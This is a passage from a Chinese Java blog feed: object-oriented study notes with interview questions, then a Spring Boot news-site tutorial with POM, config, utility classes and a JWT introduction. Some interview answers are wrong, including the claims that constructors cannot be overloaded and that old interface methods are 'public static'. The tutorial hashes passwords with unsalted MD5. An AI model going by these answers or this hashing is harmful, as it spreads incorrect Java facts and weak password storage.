<li>类的生命周期内只有一个</li>
</ul>
</li>
</ul>
</li>
<li>单例设计模式<ul>
<li>饿汉式（立即加载，线程安全）、懒汉式（延迟加载，线程不安全）及其区别</li>
<li>枚举类</li>
<li>只存在当前类的唯一实例</li>
</ul>
</li>
<li>main方法的理解</li>
</ol>
<ul>
<li>程序入口</li>
<li>使用main方法与控制台进行数据交互</li>
</ul>
<ol start="11">
<li>类的成员之四 代码块</li>
</ol>
<ul>
<li>静态代码块（类加载而执行）和非静态代码块（对象创建而执行）的区别</li>
</ul>
<ol start="12">
<li>final关键字</li>
</ol>
<ul>
<li>修饰类（不可继承），方法（不可重写），变量（常量，赋值后不可更改）</li>
</ul>
<ol start="13">
<li>abstract关键字</li>
</ol>
<ul>
<li>修饰类（不能实例化）和方法（没有方法体,必须在抽象类中）</li>
</ul>
<ol start="14">
<li>interface关键字</li>
</ol>
<ul>
<li>接口中声明的属性必须使用public static final修饰</li>
<li>接口中声明的方法<ul>
<li>jdk8&lt; 只能声明抽象方法，使用public static修饰</li>
<li>&gt;&#x3D;jdk8 声明静态方法、默认方法</li>
<li>&gt;&#x3D;jdk9 声明私有方法</li>
</ul>
</li>
</ul>
<ol start="15">
<li>类的成员之五 内部类</li>
<li>枚举类</li>
<li>注解</li>
</ol>
<ul>
<li>元注解</li>
</ul>
<ol start="18">
<li>包装类</li>
</ol>
<ul>
<li>基本数据类型 包装类 string之间的转换</li>
</ul>
<p>面试题：</p>
<ol>
<li>面向对象和面向过程的理解</li>
<li>类和对象的区别</li>
<li>java虚拟机的内存划分</li>
<li>对象存在java内存的哪块区域</li>
<li>权限修饰符的作用范围</li>
<li>main方法从public改为private后不是程序入口，这是一个普通方法</li>
<li>构造方法和普通方法的区别</li>
<li>构造器的重载</li>
<li>无参构造器和有参构造器的作用</li>
<li>成员变量和局部变量的区别</li>
<li>变量赋值和构造器加载的优先级</li>
<li>父类哪些成员可用被继承：属性方法可以继承，构造器可以调用</li>
<li>重载和重写的概念及区别</li>
<li>重载的方法是否可以改变返回值类型(不可)</li>
<li>构造器可以重载吗（不可）</li>
<li>为什么要重载（见名知义）</li>
<li>super和this的概念，区别，使用场景</li>
<li>！！！多态的理解！！！</li>
<li>多态new的对象和不多态new的对象区别(前者不可调用子类特有属性方法)</li>
<li>&#x3D;&#x3D;和equals()的区别</li>
<li>equals()的重写注意点(明确判定标准，若属性也是对象，还需重写)</li>
<li>静态变量和实例变量的区别</li>
<li>静态方法和属性能否继承和重写（可以被继承，不能被重写），为什么</li>
<li>能否从静态方法内部调用非静态方法（只能通过创建对象来实现对非静态方法的调用）</li>
<li>被static修饰的（类成员变量和方法，不包括代码块）能否用private修饰（可以）</li>
<li>哪些设计模式</li>
<li>main方法可以从public改为private吗（可以，改后不是程序入口）</li>
<li>main方法可以调用非静态方法吗（只能通过创建对象来实现对非静态方法的调用）</li>
<li>类的组成和属性赋值顺序</li>
<li>静态代码块，普通代码块，构造方法从类加载开始的执行顺序（静态-》普通-》构造方法）</li>
<li>final关键字的理解</li>
<li>final修饰一个变量时，是引用不能改变还是引用指向对象可以改变（引用不能改变，指向对象的属性可以）</li>
<li>final不能修饰构造器？（是）</li>
<li>final或static final修饰的成员变量能不能进行++（不能）</li>
<li>什么是抽象类（abstract）</li>
<li>为什么不能用abstract修饰属性私有方法构造器静态方法final方法：为语言逻辑自洽</li>
<li>接口和抽象类的区别</li>
<li>接口是否可以继承接口，抽象类是否可以继承接口，抽象类是否可以继承实现类（可可可）</li>
<li>接口可以有自己的属性吗（可public static final）</li>
<li>内部类的种类特点</li>
<li>枚举类可以继承吗（使用enum的不可以，默认父类Enum）</li>
<li>java基本类型和包装类的区别</li>
<li>对面向对象的理解<ul>
<li>面向对象的两个要素：类、对象等</li>
<li>面向对象的三大特征</li>
<li>接口，与类并列的结构，作为补充，弥补类的单继承</li>
</ul>
</li>
<li>面向对象的特征。</li>
</ol>
<h3 id="属性赋值的过程"><a href="#属性赋值的过程" class="headerlink" title="属性赋值的过程"></a>属性赋值的过程</h3><ol>
<li>类内非静态属性赋值时机(1-&gt;2&#x2F;4-&gt;3-&gt;5)：<ol>
<li>默认初始化</li>
<li>显示初始化</li>
<li>构造器初始化</li>
<li>代码块初始化</li>
<li>对象.属性或对象.方法的方式赋值</li>
</ol>
</li>
<li>字节码文件中<init>方法的简单说明<ul>
<li>每个init方法对应一个类的一个构造器</li>
<li>init方法代码中包含了实例变量的显示赋值，代码块中的赋值和构造器中的代码</li>
<li>用于初始化当前创建对象的信息</li>
</ul>
</li>
<li>实例变量赋值时机的选择<ul>
<li>显示赋值适合每个对象属性值相同的场景</li>
<li>构造器赋值适合每个对象属性值不同的场景</li>
<li>代码块赋值使用较少</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Java</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Project-Boot3MicroHeadline</title>
    <url>/2025/02/06/Java-Project-Boot3MicroHeadline/</url>
    <content><![CDATA[<h1 id="微头条"><a href="#微头条" class="headerlink" title="微头条"></a>微头条</h1><h2 id="项目功能和接口分析"><a href="#项目功能和接口分析" class="headerlink" title="项目功能和接口分析"></a>项目功能和接口分析</h2><h3 id="微头条业务简介"><a href="#微头条业务简介" class="headerlink" title="微头条业务简介"></a>微头条业务简介</h3><ul>
<li>用户功能<ul>
<li>注册功能</li>
<li>登录功能</li>
<li>jwt实现</li>
</ul>
</li>
<li>头条新闻<ul>
<li>新闻的分页浏览</li>
<li>通过标题关键字搜索新闻</li>
<li>查看新闻详情</li>
<li>新闻的修改和删除</li>
</ul>
</li>
</ul>
<h3 id="技术栈介绍"><a href="#技术栈介绍" class="headerlink" title="技术栈介绍"></a>技术栈介绍</h3><h4 id="前端技术栈"><a href="#前端技术栈" class="headerlink" title="前端技术栈"></a>前端技术栈</h4><p>ES6作为基础JS语法</p>
<p>nodejs用于运行环境</p>
<p>npm用于项目依赖管理工具</p>
<p>vite用于项目的构建架工具</p>
<p>Vue3用于项目数据的渲染框</p>
<p>Axios用于前后端数据的交互</p>
<p>Router用于页面的跳转</p>
<p>Pinia用于存储用户的数据</p>
<p>LocalStorage作为用户校验token的存储手段</p>
<p>Element-Plus提供组件</p>
<h4 id="后端技术栈"><a href="#后端技术栈" class="headerlink" title="后端技术栈"></a>后端技术栈</h4><p>JAVA作为开发语言,版本为JDK17</p>
<p>Tomcat作为服务容器,版本为10.1.7</p>
<p>Mysql8用于项目存储数据</p>
<p>SpringMVC用于控制层实现前后端数据交互</p>
<p>MyBatis-Plus用于实现数据的CURD</p>
<p>Druid用于提供数据源的连接池</p>
<p>SpringBoot作为项目基础架构</p>
<p>MD5用于用户密码的加密</p>
<p>Jwt用于token的生成和校验</p>
<p>Jackson用于转换JSON</p>
<h2 id="前端工程项目和数据库搭建"><a href="#前端工程项目和数据库搭建" class="headerlink" title="前端工程项目和数据库搭建"></a>前端工程项目和数据库搭建</h2><p>略。</p>
<h2 id="后端工程搭建"><a href="#后端工程搭建" class="headerlink" title="后端工程搭建"></a>后端工程搭建</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="导入工程依赖："><a href="#导入工程依赖：" class="headerlink" title="导入工程依赖："></a>导入工程依赖：</h4><p>依赖分析：Maven3.8.8</p>
<ul>
<li>父工程依赖：<code>spring-boot-starter-parent</code></li>
<li>Web工程依赖：<code>spring-boot-starter-web</code></li>
<li>数据库相关依赖：<ul>
<li>JDBC：<code>spring-boot-starter-jdbc</code></li>
<li>Druid：<code>druid-spring-boot-3-starter</code></li>
<li>MySQL：<code>mysql-connector-j</code></li>
</ul>
</li>
<li>Mybatis-Plus依赖：<code>mybatis-plus-spring-boot3-starter</code></li>
<li>AOP编程依赖：<code>spring-boot-starter-aop</code></li>
<li>lombok依赖：<code>lombok</code></li>
<li>单元测试依赖：<code>spring-boot-starter-test</code></li>
<li>插件：<ul>
<li>SpringBoot打包插件：<code>spring-boot-maven-plugin</code></li>
</ul>
</li>
</ul>
<p>结果：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fu<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>MicroHeadlines<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-3-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-spring-boot3-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="编写配置文件"><a href="#编写配置文件" class="headerlink" title="编写配置文件"></a>编写配置文件</h4><p>需要编写的配置项：</p>
<ul>
<li>项目暴露的端口需要按前端连接需要配置：</li>
<li>项目上下文也需要按前端连接需要配置：</li>
<li>连接池配置：</li>
<li>Mybatis-Plus配置：</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"><span class="comment"># 连接池</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql:///sm_db</span></span><br><span class="line">    <span class="attr">username:</span> <span class="number">15767</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">password</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.fu.pojo</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="attr">logic-delete-field:</span> <span class="string">isDeleted</span></span><br><span class="line">      <span class="attr">logic-delete-value:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">logic-not-delete-value:</span> <span class="number">0</span></span><br><span class="line">      <span class="attr">id-type:</span> <span class="string">auto</span></span><br><span class="line">      <span class="attr">table-prefix:</span> <span class="string">news_</span></span><br></pre></td></tr></table></figure>



<h4 id="编写启动类、添加Mybatis-Plus插件"><a href="#编写启动类、添加Mybatis-Plus插件" class="headerlink" title="编写启动类、添加Mybatis-Plus插件"></a>编写启动类、添加Mybatis-Plus插件</h4><p>需要编写的代码：</p>
<ul>
<li>main函数中启动SpringBoot工程：<code>SpringApplication.run()</code></li>
<li>添加<code>@SpringBootApplication</code>注解指明启动类、<code>@MapperScan(&quot;path&quot;)</code>指明扫描包</li>
<li>一个函数（需要放入IoC容器，添加<code>@Bean</code>注解）用于添加Mybatis-Plus插件，返回值为<code>MybatisPlusInterceptor</code>类型，需要添加的插件包括：<ul>
<li>分页插件：<code>PaginationInnerInterceptor(DbType.MYSQL)</code></li>
<li>乐观锁插件：<code>OptimisticLockerInnerInterceptor()</code></li>
<li>防全表删除插件：<code>BlockAttackInnerInterceptor()</code></li>
</ul>
</li>
</ul>
<p>结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.fu.mapper&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MyApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">mybatisPlusInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">MybatisPlusInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">        interceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">PaginationInnerInterceptor</span>(DbType.MYSQL));</span><br><span class="line">        interceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">OptimisticLockerInnerInterceptor</span>());</span><br><span class="line">        interceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">BlockAttackInnerInterceptor</span>());</span><br><span class="line">        <span class="keyword">return</span> interceptor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="工具类实现"><a href="#工具类实现" class="headerlink" title="工具类实现"></a>工具类实现</h4><p>需要一个封装了向前端返回的结果的<strong>全局统一返回结果类</strong>：应当包括状态码、返回消息（部分接口没有数据响应，只有操作是否成功的消息）、返回的数据，并提供快速构建结果的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Result</span>&lt;T&gt; &#123;</span><br><span class="line">   <span class="keyword">private</span> Integer code;</span><br><span class="line">   <span class="keyword">private</span> String message;</span><br><span class="line">   <span class="keyword">private</span> T data;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Result</span><span class="params">()</span>&#123;&#125;;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Result</span><span class="params">(Integer code, String message, T data)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.code = code;</span><br><span class="line">      <span class="built_in">this</span>.message = message;</span><br><span class="line">      <span class="built_in">this</span>.data = data;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">protected</span> <span class="keyword">static</span> &lt;T&gt; Result&lt;T&gt; <span class="title function_">build</span><span class="params">(T data)</span> &#123;</span><br><span class="line">      Result&lt;T&gt; result = <span class="keyword">new</span> <span class="title class_">Result</span>&lt;T&gt;();</span><br><span class="line">      <span class="keyword">if</span> (data != <span class="literal">null</span>) &#123;</span><br><span class="line">         result.setData(data);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Result&lt;T&gt; <span class="title function_">build</span><span class="params">(T body, Integer code, String message)</span></span><br><span class="line">   &#123;</span><br><span class="line">      Result&lt;T&gt; result = build(body);</span><br><span class="line">      result.setCode(code);</span><br><span class="line">      result.setMessage(message);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Result&lt;T&gt; <span class="title function_">build</span><span class="params">(T body, ResultCodeEnum resultCodeEnum)</span></span><br><span class="line">   &#123;</span><br><span class="line">      Result&lt;T&gt; result = build(body);</span><br><span class="line">      result.setCode(resultCodeEnum.getCode());</span><br><span class="line">      result.setMessage(resultCodeEnum.getMessage());</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 操作成功</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> data baseCategory1List</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> &lt;T&gt;</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span>&lt;T&gt; Result&lt;T&gt; <span class="title function_">ok</span><span class="params">(T data)</span>&#123;</span><br><span class="line">      Result&lt;T&gt; result = build(data);</span><br><span class="line">      <span class="keyword">return</span> build(data, ResultCodeEnum.SUCCESS);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> Result&lt;T&gt; <span class="title function_">message</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.setMessage(msg);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> Result&lt;T&gt; <span class="title function_">code</span><span class="params">(Integer code)</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.setCode(code);</span><br><span class="line">      <span class="comment">// 返回当前实例以支持链式调用</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">// get/set方法略。</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时可以抽取出常见的状态码和响应消息，便于快速构建：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">ResultCodeEnum</span> &#123;</span><br><span class="line">    SUCCESS(<span class="number">200</span>,<span class="string">&quot;success&quot;</span>),</span><br><span class="line">    USERNAME_ERROR(<span class="number">501</span>,<span class="string">&quot;usernameError&quot;</span>),</span><br><span class="line">    PASSWORD_ERROR(<span class="number">503</span>,<span class="string">&quot;passwordError&quot;</span>),</span><br><span class="line">    NOTLOGIN(<span class="number">504</span>,<span class="string">&quot;notLogin&quot;</span>),</span><br><span class="line">    USERNAME_USED(<span class="number">505</span>,<span class="string">&quot;userNameUsed&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ResultCodeEnum</span><span class="params">(Integer code, String message)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此外，为使用MD5加密，还需MD5加密工具类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MD5Util</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(String strSrc)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">char</span> hexChars[] = &#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">            <span class="type">byte</span>[] bytes = strSrc.getBytes();</span><br><span class="line">            <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            md.update(bytes);</span><br><span class="line">            bytes = md.digest();</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">            <span class="type">char</span>[] chars = <span class="keyword">new</span> <span class="title class_">char</span>[j * <span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">                <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> bytes[i];</span><br><span class="line">                chars[k++] = hexChars[b &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">0xf</span>];</span><br><span class="line">                chars[k++] = hexChars[b &amp; <span class="number">0xf</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;MD5加密出错！！+&quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="MybatisX逆向工程"><a href="#MybatisX逆向工程" class="headerlink" title="MybatisX逆向工程"></a>MybatisX逆向工程</h3><p>idea连接数据库；全选表格，按照配置方法配置，即可添加java下mapper, pojo, service,目录文件和resources下mapper目录文件。由于我们已经全局配置了数据库表和实体类的对应关系，需要删除<code>@TableName</code>注解，同时添加<code>@TableId</code>、<code>@Version</code>、<code>@TableLogic</code>注解用于指定主键、乐观锁版本、逻辑删除状态</p>
<h3 id="JWT和Token介绍及使用"><a href="#JWT和Token介绍及使用" class="headerlink" title="JWT和Token介绍及使用"></a>JWT和Token介绍及使用</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Token是一种用于标识用户的凭据，常用于无状态的认证机制。它可以是任何形式的数据，但最常见的是字符串形式。Token机制允许服务器识别用户而无需每次都查询数据库。</p>
<p><code>JWT（JSON Web Token）</code>是一种开放标准（RFC 7519），用于在网络应用环境间安全地传输信息作为JSON对象。此信息可以被验证和信任，因为它是经过数字签名的。JWT通常用于实现用户认证和信息交换。</p>
<p><strong>JWT的结构:</strong></p>
<p>一个JWT由三部分组成，每部分用点（<code>.</code>）分隔：</p>
<p><strong>Header（头部）</strong>：包含令牌类型（即JWT）和使用的签名算法（如HMAC SHA256或RSA）。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>Payload（负载）</strong>：包含声明（claims）。声明是关于实体（通常是用户）和其他数据的声明。</p>
